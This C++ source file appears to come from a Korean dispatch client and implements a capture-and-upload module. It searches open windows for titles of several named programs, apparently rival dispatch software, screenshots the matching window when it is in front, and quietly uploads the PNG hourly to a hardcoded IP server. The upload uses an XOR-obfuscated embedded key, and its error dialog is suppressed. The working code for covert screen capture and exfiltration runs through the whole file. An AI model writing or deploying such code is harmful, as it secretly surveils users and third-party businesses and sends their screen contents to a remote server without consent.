#include "StdAfx.h"
#include "CaptureUpload.h"
#include "Process.h"
#include "atlImage.h"

CCaptureUpload::CCaptureUpload(void)
{
	m_hWnd = NULL;
	m_pImageBuffer = NULL;
}

CCaptureUpload::~CCaptureUpload(void)
{
	if(m_pImageBuffer)
		delete[] m_pImageBuffer;
}

BOOL CALLBACK EnumWindowProc2(HWND hWnd, LPARAM lParam)
{
	HWND *phWnd = (HWND*)lParam;

	if(IsWindow(hWnd))
	{
		CWnd *pWnd = CWnd::FromHandle(hWnd);
		if(pWnd->GetSafeHwnd() > 0)
		{
			if(pWnd->GetParent() != 0) return TRUE;
			if(pWnd->m_hWndOwner != 0) return TRUE;
			if(!pWnd->IsWindowVisible()) return TRUE;
			if(GetWindowTextLength(hWnd) == 0) return TRUE;

			char szWindowTitle[MAX_PATH];
			::GetWindowText(hWnd, szWindowTitle, MAX_PATH);

			CString strTitle = szWindowTitle;
			strTitle.MakeUpper();

			if(strTitle.Find("[ISMOR101-접수현황]") >= 0 ||
				strTitle.Find("천하통일") >= 0 || 
				strTitle.Find("SONJA") >= 0 || 
				strTitle.Find("통합콜") >= 0 || 
				strTitle.Find("예지") >= 0)
			{
				*phWnd = hWnd;
				return FALSE;
			}
		}
	}

	return TRUE;
}

#define MINUTE 60
//#define MINUTE 1


UINT CCaptureUpload::Run()
{
	g_bana_log->Print("capture start\n");
	EnumWindows(EnumWindowProc2, (LPARAM)&m_hWnd);

	if(!m_hWnd)
		return MINUTE * 10;

	if(m_hWnd != ::GetForegroundWindow())
		return MINUTE;	

	if(!CaptureImage())
		return MINUTE * 10;	

	if(!Upload())
		return MINUTE * 10; 

	return MINUTE * 60; //성공이면 1시간 후에 재계
}

BOOL CCaptureUpload::CaptureImage()
{
	CImage capImage;
	HDC hProcessDC = ::GetDC(m_hWnd); // <-- 캡쳐 하고자하는 process의 HWND 를 넣어준다.
	CRect rect;
	::GetClientRect(m_hWnd, rect); 

	if(!hProcessDC)
		return FALSE;

	if(!capImage.Create(rect.Width(), rect.Height(), 32))
		return FALSE;

	HDC hDC = capImage.GetDC();
	BitBlt(hDC, 0, 0, rect.Width(), rect.Height(), hProcessDC, 0, 0, SRCCOPY);

	COleDateTime dtCur = COleDateTime::GetCurrentTime();
	
	///////////////////////////////////////////////////////////////////////
	//1. Bitmap 데이터를 저장하기위한 stream 파일 생성
	CComPtr<IStream> pStream = NULL;
	CComPtr<IStorage> pIStorage = NULL;
	HRESULT hr;

	hr = StgCreateDocfile(
		NULL,
		STGM_READWRITE|STGM_CREATE|STGM_SHARE_EXCLUSIVE,
		0,
		&pIStorage);

	if(FAILED(hr))
		return FALSE;

	hr = pIStorage->CreateStream(
		L"SignBitmap",
		STGM_READWRITE|STGM_SHARE_EXCLUSIVE,
		0,
		0,
		&pStream);

	if(FAILED(hr))
		return FALSE;
	////////////////////////////////////////////////////////////////////////
	//2. stream 파일에 Bitmap 데이터 저장
	hr = capImage.Save(pStream, Gdiplus::ImageFormatPNG);//stream파일에 bmp파일 저장
	if(FAILED(hr))
		return FALSE;

	capImage.ReleaseDC();


	///////////////////////////////////////////////////////////////////////
	//3. stream 파일에 저장된 Bitmap 데이터를 BYTE 데이터로 변환
	BYTE* pBuff = NULL;
	ULONG nRead = 0;

	ULARGE_INTEGER uFileSize;
	LARGE_INTEGER lnOffset = {0,};
	lnOffset.QuadPart = 0;

	pStream->Seek(lnOffset, STREAM_SEEK_END, &uFileSize);//이미지 파일의 크기를 구함
	pStream->Seek(lnOffset, STREAM_SEEK_SET, NULL);//스트림파일 제일 앞으로 포인터 이동

	if(uFileSize.HighPart == 0 && uFileSize.LowPart == 0)
		return FALSE;

	ULONG nFileSize = uFileSize.LowPart;
	m_pImageBuffer = new CHAR[nFileSize];
	if(!m_pImageBuffer)
		return FALSE;//메모리할당 실패

	hr = pStream->Read(m_pImageBuffer, nFileSize, &nRead);
	if(nRead < nFileSize || FAILED(hr))
	{
		//파일크기 만큼 데이터 읽기 실패
		delete[] m_pImageBuffer;
		m_pImageBuffer = NULL;
		return FALSE;
	}

	m_nFileSize = nFileSize;
	return TRUE;
}

#define PST_START_UPDATE_UPLOAD 6039

BOOL CCaptureUpload::Upload()
{
	if(!m_pImageBuffer)
		return FALSE;

	CMkDatabase *pMkDb = new CMkDatabase(g_bana_log);

	try 
	{
		CString strAddr = "211.172.242.178";
		CString strServerPath, strBackup, strUpdateFiles, strUpdateSystem;
		CString strFileName;

		strFileName.Format("%d_%d_%s.PNG", m_ci.m_nCompanyCode, m_ui.nWNo, COleDateTime::GetCurrentTime().Format("%Y%m%d_%H%M%S"));

		BYTE nXorKey = (pMkDb->GetXorKey() + 3) % 128;
		BYTE des_key_new[] = {29,44,2,83,32,98,10,8};
		BYTE nXoredKey[8];

		for(int i = 0; i < 8; i++)
			nXoredKey[i] = des_key_new[i] ^ ((nXorKey + i) % 128);
		pMkDb->SetServerKey(nXoredKey); 
		pMkDb->SetErrorMsgType(2);

		if(!pMkDb->Open(strAddr, 3610)) 
			throw "서버에 접속할 수 없습니다.";

		CMkRecordset rs(pMkDb);
		UINT nType = PT_OK, nSubType = PST_START_UPDATE_UPLOAD, nSize = 0;
		if(!rs.ExecuteRecordsetOnly(nType, nSubType, nSize, ""))
			throw "통신중에 오류가 발생했습니다.";

		rs.GetFieldValue(0, strServerPath);
		rs.GetFieldValue(1, strBackup);
		rs.GetFieldValue(2, strUpdateFiles);
		rs.GetFieldValue(3, strUpdateSystem);
		rs.Close();

		CString strServerFileName = strServerPath + "\\" + strBackup + "\\QuickImage\\" + strFileName;

		if(!pMkDb->UploadFile(strServerFileName, m_pImageBuffer, m_nFileSize))
			throw "파일 업로드중에 에러발생";

		g_bana_log->Print("capture true\n");
		delete pMkDb;
		return TRUE;
	}
	catch(char *msg)
	{
		UNUSED_ALWAYS(msg);
//		AfxMessageBox(msg);
	}

	delete pMkDb;
	return FALSE;
}